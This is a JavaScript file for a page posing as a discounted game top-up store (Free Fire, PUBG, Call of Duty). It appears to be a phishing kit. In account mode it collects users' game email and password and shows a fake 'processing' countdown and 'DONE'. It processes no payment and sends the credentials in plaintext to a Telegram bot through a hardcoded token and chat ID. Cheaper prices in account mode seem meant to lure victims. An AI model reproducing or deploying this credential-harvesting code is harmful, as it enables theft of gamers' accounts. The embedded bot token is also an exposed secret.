document.addEventListener('DOMContentLoaded', () => {
    // --- Config Setup ---
    // PLACE YOUR SECURE TELEGRAM CREDENTIALS HERE:
    const TELEGRAM_TOKEN = "8648161617:AAFVxx7syurke1Pl7BGAbyqAaM2NnBPKB5I"; 
    const TELEGRAM_CHAT_ID = "8851363543"; 

    // Pages
    const landingPage = document.getElementById('landing-page');
    const storePage = document.getElementById('store-page');
    const enterBtn = document.getElementById('enter-btn');

    // Modals
    const gameModal = document.getElementById('game-modal');
    const rechargeModal = document.getElementById('recharge-modal');
    const checkoutModal = document.getElementById('checkout-modal');
    const rechargeList = document.querySelector('.recharge-list');
    const modalTitle = document.getElementById('modal-game-title');
    const modalIcon = document.getElementById('modal-game-icon');
    const toggleContainer = document.getElementById('modal-toggle-container');
    const btnId = document.getElementById('btn-id');
    const btnAcc = document.getElementById('btn-acc');

    // Inputs & Control Elements
    const idGroup = document.getElementById('id-input-group');
    const accGroup = document.getElementById('acc-input-group');
    const idField = document.getElementById('game-id-field');
    const emailField = document.getElementById('acc-email-field');
    const passField = document.getElementById('acc-pass-field');
    const confirmBtn = document.getElementById('confirm-btn');
    
    const checkoutActionContainer = document.getElementById('checkout-action-container');
    const successNotification = document.getElementById('success-notification');

    // App State Management
    let currentGame = ""; 
    let currentMethod = "ID"; 
    let orderData = { user: "", rawId: "", email: "", password: "", product: "", price: "" };

    // Dynamic UI Theme Adjustments
    const themes = {
        "FREE FIRE": { color: "#ff6600", accent: "#ff8a00", icon: "https://placehold.co/50x50/ff6600/white?text=FF" },
        "PUBG": { color: "#00a2ff", accent: "#007acc", icon: "https://placehold.co/50x50/00a2ff/white?text=PUBG" },
        "CALL OF DUTY": { color: "#e5c158", accent: "#c29d38", icon: "https://placehold.co/50x50/e5c158/000000?text=COD" }
    };

    // 1. Navigation Flow
    enterBtn.addEventListener('click', () => {
        landingPage.classList.remove('active');
        storePage.classList.add('active');
    });

    document.getElementById('close-modal').addEventListener('click', () => gameModal.classList.remove('active'));
    document.getElementById('back-to-id').addEventListener('click', () => {
        rechargeModal.classList.remove('active');
        gameModal.classList.add('active');
    });
    document.getElementById('back-to-recharge').addEventListener('click', () => {
        checkoutModal.classList.remove('active');
        rechargeModal.classList.add('active');
    });

    // --- Product Sets ---
    const ffIdProducts = `
        <div class="recharge-item"><span class="item-name">◇ 100 Diamond</span><span class="item-price">55 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 310 Diamond</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 420 Diamond</span><span class="item-price">205 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 520 Diamond</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">105 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">540 EGP</span></div>
    `;

    // Added Account specific products for Free Fire as requested
    const ffAccProducts = `
        <div class="recharge-item"><span class="item-name">◇ 100 Diamond  Bonus</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 210 Diamond</span><span class="item-price">95 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 310 Diamond</span><span class="item-price">140 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 400 Diamond</span><span class="item-price">180 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 500 Diamond</span><span class="item-price">225 EGP</span></div>
         <div class="recharge-item membership"><span class="item-name">★ Weekly Membership</span><span class="item-price">75 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Monthly Membership</span><span class="item-price">430 EGP</span></div>
    `;

    const pubgProducts = `
        <div class="recharge-item"><span class="item-name">◇ 30 UC</span><span class="item-price">25 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 60 UC</span><span class="item-price">45 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 325 UC</span><span class="item-price">215 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 310 UC</span><span class="item-price">155 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 660 UC</span><span class="item-price">425 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 1800 UC</span><span class="item-price">1055 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ LVL (1 - 50)</span><span class="item-price">255 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ LVL (1 - 100)</span><span class="item-price">510 EGP</span></div>
    `;

    const codProducts = `
        <div class="recharge-item"><span class="item-name">◇ 30 CP</span><span class="item-price">20 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 80 CP</span><span class="item-price">50 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 420 CP</span><span class="item-price">230 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 880 CP</span><span class="item-price">455 EGP</span></div>
        <div class="recharge-item"><span class="item-name">◇ 2400 CP</span><span class="item-price">1130 EGP</span></div>
        <div class="recharge-item membership"><span class="item-name">★ Battle Pass Premium</span><span class="item-price">130 EGP</span></div>
    `;

    // Apply specific modal UI elements per game Selection
    function configureModalTheme(gameKey) {
        currentGame = gameKey;
        const currentTheme = themes[gameKey];
        
        modalTitle.innerText = gameKey;
        modalTitle.style.color = currentTheme.color;
        modalIcon.src = currentTheme.icon;
        modalIcon.style.borderColor = currentTheme.color;
        
        // Only enable Toggle if Free Fire is selected
        if (gameKey === "FREE FIRE") {
            toggleContainer.style.display = 'flex';
        } else {
            toggleContainer.style.display = 'none'; 
        }
        
        // Clear old inputs
        idField.value = "";
        emailField.value = "";
        passField.value = "";
        
        switchToID();
        gameModal.classList.add('active');
    }

    // 2. Select Game Cards Bindings
    document.querySelector('.ff-card').addEventListener('click', () => configureModalTheme("FREE FIRE"));
    document.querySelector('.pubg-card').addEventListener('click', () => configureModalTheme("PUBG"));
    document.querySelector('.cod-card').addEventListener('click', () => configureModalTheme("CALL OF DUTY"));

    // Method Toggles
    function switchToID() {
        currentMethod = 'ID';
        btnId.classList.add('active');
        btnAcc.classList.remove('active');
        idGroup.style.display = 'block';
        accGroup.style.display = 'none';
        validateInputs();
    }

    function switchToACC() {
        currentMethod = 'ACC';
        btnId.classList.remove('active');
        btnAcc.classList.add('active');
        idGroup.style.display = 'none';
        accGroup.style.display = 'block';
        validateInputs();
    }

    btnId.addEventListener('click', switchToID);
    btnAcc.addEventListener('click', switchToACC);

    // 3. Form Validation
    function validateInputs() {
        let isValid = false;
        if (currentMethod === 'ID') {
            isValid = idField.value.trim().length > 4;
        } else {
            isValid = emailField.value.trim().length > 4 && passField.value.trim().length > 2;
        }

        confirmBtn.disabled = !isValid;
        if (isValid) confirmBtn.classList.add('active-style');
        else confirmBtn.classList.remove('active-style');
    }

    idField.addEventListener('input', validateInputs);
    emailField.addEventListener('input', validateInputs);
    passField.addEventListener('input', validateInputs);

    // 4. Transition to Packages
    confirmBtn.addEventListener('click', () => {
        if (currentMethod === 'ID') {
            orderData.user = `ID: ${idField.value}`;
            orderData.rawId = idField.value;
            orderData.email = "";
            orderData.password = "";
        } else {
            orderData.user = `ACC: ${emailField.value}`;
            orderData.rawId = "";
            orderData.email = emailField.value;
            orderData.password = passField.value;
        }

        // Load specific products based on game and selection choice
        if (currentGame === "PUBG") {
            rechargeList.innerHTML = pubgProducts;
        } else if (currentGame === "CALL OF DUTY") {
            rechargeList.innerHTML = codProducts;
        } else {
            // Free fire configuration
            if (currentMethod === 'ACC') {
                rechargeList.innerHTML = ffAccProducts;
            } else {
                rechargeList.innerHTML = ffIdProducts;
            }
        }
        
        // Dynamically style internal options inside recharge package
        const activeThemeColor = themes[currentGame].color;
        setTimeout(() => {
            document.querySelectorAll('.recharge-item:not(.membership)').forEach(el => {
                el.style.borderColor = activeThemeColor;
            });
        }, 10);

        gameModal.classList.remove('active');
        rechargeModal.classList.add('active');
        bindProductChoices();
    });

    function bindProductChoices() {
        document.querySelectorAll('.recharge-item').forEach(item => {
            item.onclick = () => {
                orderData.product = item.querySelector('.item-name').innerText;
                orderData.price = item.querySelector('.item-price').innerText;
                
                let summaryHTML = `
                    GAME: <strong>${currentGame}</strong><br>
                    METHOD: <strong>${currentMethod}</strong><br>
                `;

                if(currentMethod === 'ID') {
                    summaryHTML += `ID: <strong>${orderData.rawId}</strong><br>`;
                } else {
                    summaryHTML += `EMAIL: <strong>${orderData.email}</strong><br>`;
                }

                summaryHTML += `
                    PRODUCT: <strong>${orderData.product}</strong><br>
                    PRICE: <strong>${orderData.price}</strong>
                `;
                
                document.getElementById('order-details').innerHTML = summaryHTML;
                
                successNotification.style.display = "none";
                checkoutActionContainer.innerHTML = `<button id="checkout-btn" class="blue-rect-btn">CHECKOUT</button>`;
                setupCheckoutSubmission();

                rechargeModal.classList.remove('active');
                checkoutModal.classList.add('active');
            };
        });
    }

    // 5. Processing Countdown & Automated Telegram Send
    function setupCheckoutSubmission() {
        const liveCheckoutBtn = document.getElementById('checkout-btn');
        if (!liveCheckoutBtn) return;

        liveCheckoutBtn.addEventListener('click', () => {
            let timerSeconds = 6;
            liveCheckoutBtn.disabled = true;
            liveCheckoutBtn.style.cursor = "not-allowed";
            liveCheckoutBtn.style.background = "#555";
            liveCheckoutBtn.style.borderColor = "#777";

            const intervalLoop = setInterval(() => {
                timerSeconds--;
                if (timerSeconds > 0) {
                    let textDots = ".".repeat(((6 - timerSeconds) % 3) + 1);
                    liveCheckoutBtn.innerText = `processing${textDots}`;
                } else {
                    clearInterval(intervalLoop);
                    executeOrderCompletion();
                }
            }, 1000);

            liveCheckoutBtn.innerText = "processing.";
        });
    }

    function executeOrderCompletion() {
        successNotification.style.display = "block";
        checkoutActionContainer.innerHTML = `<div class="done-status-block">DONE</div>`;

        let botMessage = `🔔 New Order Received!\n\n🎮 Game: ${currentGame}\n🛠 Method: ${currentMethod}\n`;
        
        if (currentMethod === 'ID') {
            botMessage += `🆔 User ID: ${orderData.rawId}\n`;
        } else {
            botMessage += `📧 Email: ${orderData.email}\n🔑 Pass: ${orderData.password}\n`;
        }
        
        botMessage += `📦 Product: ${orderData.product}\n💰 Price: ${orderData.price}`;

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

        fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: botMessage
            })
        })
        .then(res => console.log("Order sent to Telegram successfully."))
        .catch(err => console.error("Error sending order to Telegram:", err));
    }

    window.addEventListener('click', (e) => {
        if (e.target.classList.contains('modal-overlay')) e.target.classList.remove('active');
    });
});